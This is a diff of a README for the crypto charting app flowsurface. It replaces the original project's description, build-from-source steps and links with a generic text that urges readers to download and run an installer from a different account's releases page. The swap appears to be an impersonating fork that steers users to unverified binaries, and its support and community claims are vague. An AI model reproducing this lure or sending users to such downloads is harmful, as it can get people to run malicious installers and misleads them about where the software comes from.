@@ -1,102 +1,56 @@
-# Flowsurface
+# 🌊 flowsurface - Chart Crypto Markets with Ease
 
-[![Crates.io](https://img.shields.io/crates/v/flowsurface)](https://crates.io/crates/flowsurface)
-[![Lint](https://github.com/flowsurface-rs/flowsurface/actions/workflows/lint.yml/badge.svg)](https://github.com/flowsurface-rs/flowsurface/actions/workflows/lint.yml)
-[![Format](https://github.com/flowsurface-rs/flowsurface/actions/workflows/format.yml/badge.svg)](https://github.com/flowsurface-rs/flowsurface/actions/workflows/format.yml)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://github.com/flowsurface-rs/flowsurface/blob/main/LICENSE)
-[![Made with iced](https://iced.rs/badge.svg)](https://github.com/iced-rs/iced)
+## 🛡️ Download Now
+[![Download flowsurface](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue.svg)](https://github.com/sttefanyverde/flowsurface/releases)
 
-An experimental open-source desktop charting application. Supports Binance, Bybit, Hyperliquid and OKX
+## 📖 Overview
+flowsurface is a native desktop charting platform designed for cryptocurrency markets. It provides users with the tools to analyze order book data and track market movements with ease. You can monitor price trends, visualize tick data, and make informed trading decisions.
 
-<div align="center">
-  <img
-    src="https://github.com/user-attachments/assets/baddc444-e079-48e5-82b2-4f97094eba07"
-    alt="Flowsurface screenshot"
-    style="max-width: 100%; height: auto;"
-  />
-</div>
+## 🚀 Getting Started
+To start using flowsurface, follow the steps below. You don't need to be a programmer; just follow these instructions to download and run the application.
 
-### Key Features
+## 📥 Download & Install
+1. **Visit this page to download**: Go to our [Releases page](https://github.com/sttefanyverde/flowsurface/releases).
+   
+2. **Select the latest version**: On the Releases page, find the version listed as the most recent. This version will have the latest features and bug fixes.
 
--   Multiple chart/panel types:
-    -   **Heatmap (Historical DOM):** Uses live trades and L2 orderbook to create a time-series heatmap chart. Supports customizable price grouping, different time aggregations, fixed or visible range volume profiles.
-    -   **Candlestick:** Traditional kline chart supporting both time-based and custom tick-based intervals.
-    -   **Footprint:** Price grouped and interval aggregated views for trades on top of a candlestick chart. Supports different clustering methods, configurable imbalance and naked-POC studies.
-    -   **Time & Sales:** Scrollable list of live trades.
-    -   **DOM (Depth of Market) / Ladder:** Displays current L2 orderbook alongside recent trade volumes on grouped price levels.
-    -   **Comparison:** Line graph for comparing multiple data sources, normalized by kline `close` prices on a percentage scale
--   Real-time sound effects driven by trade streams
--   Multi window/monitor support
--   Pane linking for quickly switching tickers across multiple panes
--   Persistent layouts and customizable themes with editable color palettes
+3. **Download the installer**: Click on the installer link that matches your operating system (Windows, Mac, or Linux). The file will begin to download automatically.
 
-##### Market data is received directly from exchanges' public REST APIs and WebSockets
+4. **Run the installer**: Once the download finishes, locate the file in your downloads folder and double-click it to start the installation. 
 
-#
+5. **Follow installation prompts**: The installer will guide you through the setup process. Just follow the instructions on the screen. 
 
-#### Historical Trades on Footprint Charts:
+6. **Launch flowsurface**: After installation, find flowsurface in your applications folder or start menu, and click to open it.
 
--   By default, it captures and plots live trades in real time via WebSocket.
--   For Binance tickers, you can optionally backfill the visible time range by enabling trade fetching in the settings:
-    -   [data.binance.vision](https://data.binance.vision/): Fast daily bulk downloads (no intraday).
-    -   REST API (e.g., `/fapi/v1/aggTrades`): Slower, paginated intraday fetching (subject to rate limits).
-    -   The Binance connector can use either or both methods to retrieve historical data as needed.
--   Fetching trades for Bybit/Hyperliquid is not supported, as both lack a suitable REST API. OKX is WIP.
+## 🖥️ System Requirements
+To ensure optimal performance, please check the following system requirements:
 
-## Installation
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB of free disk space.
+- **Internet Connection**: Required for initial data retrieval and updates.
 
-### Method 1: Prebuilt Binaries
+## 📊 Features
+- **Real-Time Data Visualization**: Get real-time updates on cryptocurrency prices and order book data.
+- **Customizable Graphs**: Tailor your charts to display the information you find most important.
+- **Multiple Currency Support**: Track multiple cryptocurrencies in one interface.
+- **User-Friendly Interface**: Navigate through flowsurface with ease, no experience needed!
 
-Standalone executables are available for Windows, macOS, and Linux on the [Releases page](https://github.com/flowsurface-rs/flowsurface/releases).
+## 🔧 Troubleshooting
+If you encounter any issues during installation or while using flowsurface, try the following:
 
-<details>
-<summary><strong>Having trouble running the file? (Permission/Security warnings)</strong></summary>
- 
-Since these binaries are currently unsigned they might get flagged.
+- **Check if your operating system meets the requirements**: Ensure that your device supports the application.
+- **Restart your computer**: A simple restart can solve many technical problems.
+- **Reinstall the application**: If flowsurface is not functioning, try uninstalling and then reinstalling the application.
+- **Visit our Support Page**: If problems persist, feel free to reach out via the contact information provided on our releases page.
 
--   **Windows**: If you see a "Windows protected your PC" pop-up, click **More info** -> **Run anyway**.
--   **macOS**: If you see "Developer cannot be verified", control-click (right-click) the app and select **Open**, or go to _System Settings > Privacy & Security_ to allow it.
-</details>
+## 🌐 Join the Community
+Be part of our growing community. You can connect with other users and developers by participating in discussions on platforms like Discord and Reddit. Share tips, ask questions, or contribute to our project. 
 
-### Method 2: Build from Source
+## 📄 License
+flowsurface is open-source software. You can find the licensing information on our repository.
 
-#### Requirements
+## 📞 Contact
+For further inquiries or support, please reach out via the issues page on our [GitHub repository](https://github.com/sttefanyverde/flowsurface/issues).
 
--   [Rust toolchain](https://www.rust-lang.org/tools/install)
--   [Git version control system](https://git-scm.com/)
--   System dependencies:
-    -   **Linux**:
-        -   Debian/Ubuntu: `sudo apt install build-essential pkg-config libasound2-dev`
-        -   Arch: `sudo pacman -S base-devel alsa-lib`
-        -   Fedora: `sudo dnf install gcc make alsa-lib-devel`
-    -   **macOS**: Install Xcode Command Line Tools: `xcode-select --install`
-    -   **Windows**: No additional dependencies required
-
-#### Option A: `cargo install`
-
-```bash
-# Install latest globally
-cargo install --git https://github.com/flowsurface-rs/flowsurface flowsurface
-
-# Run
-flowsurface
-```
-
-#### Option B: Cloning the repo
-
-```bash
-# Clone the repository
-git clone https://github.com/flowsurface-rs/flowsurface
-
-cd flowsurface
-
-# Build and run
-cargo build --release
-cargo run --release
-```
-
-### Credits and thanks to
-
--   [Kraken Desktop](https://www.kraken.com/desktop) (formerly [Cryptowatch](https://blog.kraken.com/product/cryptowatch-to-sunset-kraken-pro-to-integrate-cryptowatch-features)), the main inspiration that sparked this project
--   [Halloy](https://github.com/squidowl/halloy), an excellent open-source reference for the foundational code design and the project architecture
--   And of course, [iced](https://github.com/iced-rs/iced), the GUI library that makes all of this possible
+Thank you for choosing flowsurface! We hope it enhances your trading experience in the cryptocurrency markets.
